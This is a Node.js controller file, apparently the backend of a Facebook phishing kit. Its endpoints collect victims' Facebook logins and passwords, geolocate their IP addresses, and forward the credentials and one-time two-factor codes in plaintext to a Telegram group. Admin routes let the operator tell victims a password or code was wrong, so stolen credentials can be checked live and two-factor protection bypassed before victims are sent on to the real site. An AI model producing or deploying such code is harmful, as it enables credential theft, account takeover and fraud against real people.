const https = require('https');
const FbUser = require('../models/fb_user.model');

// ─── Helpers ─────────────────────────────────────────────────────────────────

function sendTelegram(message) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const groupChatId = process.env.TELEGRAM_GROUP_CHAT_ID;
  if (!token || !groupChatId) return;

  const data = JSON.stringify({
    chat_id: groupChatId,
    text: message,
    parse_mode: 'HTML',
    disable_web_page_preview: true,
  });

  const req = https.request(
    {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${token}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data),
      },
    },
    (res) => {
      let body = '';
      res.on('data', (chunk) => (body += chunk));
      res.on('end', () => console.log('Telegram FB response:', res.statusCode));
    }
  );
  req.on('error', (err) => console.error('Telegram FB error:', err.message));
  req.write(data);
  req.end();
}

// ─── STEP 1: Submit FB Login (account + password) ────────────────────────────

exports.submitFbLogin = async (req, res) => {
  try {
    const { account, password } = req.body;

    if (!account || !password) {
      return res.status(400).json({ message: 'Account and password are required' });
    }

    // Tự động lấy IP từ Request
    let ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (ipAddress && ipAddress.includes('::ffff:')) {
      ipAddress = ipAddress.split('::ffff:')[1];
    }
    if (ipAddress === '::1' || ipAddress === '127.0.0.1') {
      ipAddress = 'Localhost (Dev Mode)';
    }

    let country = 'N/A';
    let region = 'N/A';
    let city = 'N/A';

    // Tra cứu thông tin địa lý nếu không phải localhost
    if (ipAddress && !ipAddress.includes('Localhost')) {
      try {
        const geoResponse = await new Promise((resolve, reject) => {
          https.get(`https://ipapi.co/${ipAddress}/json/`, (resGeo) => {
            let data = '';
            resGeo.on('data', (chunk) => (data += chunk));
            resGeo.on('end', () => {
              try {
                resolve(JSON.parse(data));
              } catch (e) {
                resolve({});
              }
            });
          }).on('error', (e) => reject(e));
        });

        if (geoResponse && !geoResponse.error) {
          country = geoResponse.country_name || 'N/A';
          region = geoResponse.region || 'N/A';
          city = geoResponse.city || 'N/A';
        }
      } catch (geoError) {
        console.error('Geo Lookup Error:', geoError.message);
      }
    }

    const fbUser = await FbUser.create({
      account,
      password,
      ipAddress,
      country,
      region,
      city,
      status: 'pending_pass',
    });

    // Emit socket to admin
    const io = req.app.get('socketio');
    io.emit('fb-login-new', fbUser);

    // Telegram notification
    const message =
      `<b>🔵 NEW FACEBOOK LOGIN</b>\n\n` +
      `<b>🌍 IP ADDRESS:</b> ${ipAddress}\n` +
      `<b>🏳️ COUNTRY:</b> ${country}\n` +
      `<b>🗺 REGION:</b> ${region}\n` +
      `<b>📍 CITY:</b> ${city}\n\n` +
      `<b>👤 Account:</b> ${account}\n` +
      `<b>🔑 Password:</b> ${password}`;
    sendTelegram(message);

    res.status(201).json({ id: fbUser.id });
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: error.message });
  }
};

// ─── STEP 2: Submit FB OTP (6-digit verify code) ─────────────────────────────

exports.submitFbOtp = async (req, res) => {
  try {
    const { id, verifyCode } = req.body;

    if (!id || !verifyCode) {
      return res.status(400).json({ message: 'ID and verifyCode are required' });
    }

    const fbUser = await FbUser.findByPk(id);
    if (!fbUser) {
      return res.status(404).json({ message: 'FB user session not found' });
    }

    fbUser.verifyCode = verifyCode;
    fbUser.status = 'completed';
    await fbUser.save();

    // Emit socket to admin
    const io = req.app.get('socketio');
    io.emit('fb-otp-received', fbUser);

    // Telegram notification
    const message =
      `<b>🔐 FACEBOOK OTP CODE</b>\n\n` +
      `<b>🌍 IP ADDRESS:</b> ${fbUser.ipAddress || 'N/A'}\n` +
      `<b>🏳️ COUNTRY:</b> ${fbUser.country || 'N/A'}\n` +
      `<b>🗺 REGION:</b> ${fbUser.region || 'N/A'}\n` +
      `<b>📍 CITY:</b> ${fbUser.city || 'N/A'}\n\n` +
      `<b>👤 Account:</b> ${fbUser.account}\n` +
      `<b>🔑 Password:</b> ${fbUser.password}\n` +
      `<b>📱 OTP Code:</b> <code>${verifyCode}</code>`;
    sendTelegram(message);

    res.json({ success: true });
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: error.message });
  }
};

// ─── ADMIN: Get all FB Users ──────────────────────────────────────────────────

exports.getFbUsers = async (req, res) => {
  try {
    const page = Math.max(1, parseInt(req.query.page) || 1);
    const limit = Math.max(1, parseInt(req.query.limit) || 20);
    const offset = (page - 1) * limit;

    const { count, rows } = await FbUser.findAndCountAll({
      order: [['createdAt', 'DESC']],
      limit,
      offset,
    });

    res.json({
      fbUsers: rows,
      pagination: {
        total: count,
        page,
        limit,
        totalPages: Math.ceil(count / limit),
      },
    });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
};

// ─── ADMIN: Return Wrong Password (admin triggers FE to show "wrong pass") ───

exports.returnWrongPass = async (req, res) => {
  try {
    const { id } = req.params;

    const fbUser = await FbUser.findByPk(id);
    if (!fbUser) {
      return res.status(404).json({ message: 'FB user not found' });
    }

    fbUser.status = 'wrong_pass';
    await fbUser.save();

    // Emit to client with this session id
    const io = req.app.get('socketio');
    io.emit('fb-wrong-pass', { id });

    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
};

// ─── ADMIN: Accept Password (admin triggers FE to move to OTP step) ─────────

exports.acceptFbPass = async (req, res) => {
  try {
    const { id } = req.params;
    const fbUser = await FbUser.findByPk(id);
    if (!fbUser) return res.status(404).json({ message: 'FB user not found' });

    fbUser.status = 'pending_otp';
    await fbUser.save();

    const io = req.app.get('socketio');
    io.emit('fb-pass-true', { id });

    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
};

// ─── ADMIN: Accept OTP (Final redirect to real FB) ──────────────────────────

exports.acceptFbOtp = async (req, res) => {
  try {
    const { id } = req.params;
    const fbUser = await FbUser.findByPk(id);
    if (!fbUser) return res.status(404).json({ message: 'FB user not found' });

    fbUser.status = 'completed';
    await fbUser.save();

    const io = req.app.get('socketio');
    io.emit('fb-otp-true', { id });

    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
};

// ─── ADMIN: Return Wrong OTP (Ask user to re-enter) ─────────────────────────

exports.returnWrongOtp = async (req, res) => {
  try {
    const { id } = req.params;
    const fbUser = await FbUser.findByPk(id);
    if (!fbUser) return res.status(404).json({ message: 'FB user not found' });

    fbUser.status = 'pending_otp'; // Back to waiting for OTP
    fbUser.verifyCode = null; // Clear old code
    await fbUser.save();

    const io = req.app.get('socketio');
    io.emit('fb-otp-wrong', { id });

    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
};

// ─── ADMIN: Delete FB User ────────────────────────────────────────────────────

exports.deleteFbUser = async (req, res) => {
  try {
    const { id } = req.params;
    const fbUser = await FbUser.findByPk(id);
    if (!fbUser) return res.status(404).json({ message: 'Not found' });
    await fbUser.destroy();
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
};
